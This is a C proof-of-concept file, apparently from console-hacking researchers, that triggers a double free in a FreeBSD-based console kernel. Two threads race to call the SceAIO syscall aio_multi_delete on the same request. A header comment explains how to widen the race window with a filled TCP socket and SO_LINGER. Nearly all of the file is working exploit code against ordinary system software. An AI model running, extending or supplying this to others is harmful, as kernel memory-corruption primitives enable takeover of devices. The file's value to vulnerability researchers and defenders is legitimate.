// BUG: aio_multi_delete() improper locking leads to Double Free


// for those who want to play around it before we release a more complete poc. pass a client TCP socket (reqs.fd = tcp_sd) and setsockopt SO_LINGER to some high timeout. fill the client socket w/ a bunch of garbage data until it's full. this will cause aio_multi_delete to sleep before NULL-ing out the entry slot and gives time to the other thread to double free the same entry. SO_LINGER acts differently on freebsd, you have to fill the socket to trigger sleep. the poc we posted is likely to NULL-deref crash

#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>

#define SYS_AIO_SUSPEND         0x13B
#define SYS_AIO_MULTI_DELETE    0x296
#define SYS_AIO_MULTI_WAIT      0x297
#define SYS_AIO_MULTI_POLL      0x298
#define SYS_AIO_GET_DATA        0x299
#define SYS_AIO_MULTI_CANCEL    0x29A
#define SYS_AIO_CREATE          0x29C
#define SYS_AIO_SUBMIT_CMD      0x29D
#define SYS_AIO_INIT            0x29E
#define SYS_AIO_MLOCK           0x2B0

// SceAIO submit commands
#define SCE_KERNEL_AIO_CMD_READ     0x001
#define SCE_KERNEL_AIO_CMD_WRITE    0x002
#define SCE_KERNEL_AIO_CMD_MASK     0xfff
// SceAIO submit command flags
#define SCE_KERNEL_AIO_CMD_MULTI 0x1000

#define SCE_KERNEL_AIO_PRIORITY_LOW     1
#define SCE_KERNEL_AIO_PRIORITY_MID     2
#define SCE_KERNEL_AIO_PRIORITY_HIGH    3

typedef struct {
    off_t offset;
    size_t nbyte;
    void *buf;
    struct SceKernelAioResult *result;
    int fd;
} SceKernelAioRWRequest;

typedef int SceKernelAioSubmitId;

int aio_submit_cmd(
    u_int cmd,
    SceKernelAioRWRequest reqs[],
    u_int num_reqs,
    u_int prio,
    SceKernelAioSubmitId ids[]
)
{
    return __syscall(
        SYS_AIO_SUBMIT_CMD,
        cmd,
        reqs,
        num_reqs,
        prio,
        ids
    );
}

// wait for all (AND) or atleast one (OR) to finish
#define SCE_KERNEL_AIO_WAIT_AND 0x01
#define SCE_KERNEL_AIO_WAIT_OR  0x02

int aio_multi_wait(
    SceKernelAioSubmitId ids[],
    u_int num_ids,
    int sce_errors[],
    // SCE_KERNEL_AIO_WAIT_*
    uint32_t mode,
    useconds_t *usec
)
{
    return __syscall(
        SYS_AIO_MULTI_WAIT,
        ids,
        num_ids,
        sce_errors,
        mode,
        usec
    );
}

int aio_multi_delete(
    SceKernelAioSubmitId ids[],
    u_int num_ids,
    int sce_errors[]
)
{
    return __syscall(
        SYS_AIO_MULTI_DELETE,
        ids,
        num_ids,
        sce_errors
    );
}

const int num_reqs = 3;
const int which_req = 0;
int race_errs[2];
pthread_barrier_t barrier;

void *race_func(void *arg) {
    int *id = (int *)arg;

    pthread_barrier_wait(&barrier);
    aio_multi_delete(id, 1, &race_errs[1]);

    return NULL;
}

int main(void) {
    SceKernelAioRWRequest reqs[num_reqs] = {0};
    int ids[num_reqs] = {0};
    int sce_errs[num_reqs] = {0};

    // bare minimum initialization to succeed in calling aio_submit_cmd()
    for (int i = 0; i < num_reqs; i++) {
        reqs[i].fd = -1;
    }

    pthread_barrier_init(&barrier, NULL, 2);

    for (int i = 0; i < 100; i++) {
        // command and priority don't matter but the MULTI flag is required
        aio_submit_cmd(
            SCE_KERNEL_AIO_CMD_WRITE | SCE_KERNEL_AIO_CMD_MULTI,
            reqs,
            num_reqs,
            SCE_KERNEL_AIO_PRIORITY_HIGH,
            ids
        );

        // you can't delete any request that is already being processed by a
        // SceFsstAIO worker thread
        //
        // we just wait on all of them instead of polling and checking whether
        // a request is being processed. polling is also error-prone since the
        // result can become out of date
        aio_multi_wait(ids, num_reqs, sce_errs, SCE_KERNEL_AIO_WAIT_AND, 0);

        pthread_t race_thread;
        pthread_create(&race_thread, NULL, race_func, &ids[which_req]);
        pthread_barrier_wait(&barrier);

        // double delete request which_req
        aio_multi_delete(&ids[which_req], 1, &race_errs[0]);

        pthread_join(race_thread, NULL);

        printf("0x%X | 0x%X\n", race_errs[0], race_errs[1]);

        // either both are 0 or one of the errors is SCE_KERNEL_ERROR_ESRCH
        // (0x80020003) and the other is 0. you'll never get double
        // SCE_KERNEL_ERROR_ESRCH
        if (race_errs[0] == race_errs[1]) {
            printf("Double Free achieved!\n");
            return 0;
        }
    }
    printf("Double Free failed\n");

    return 0;
}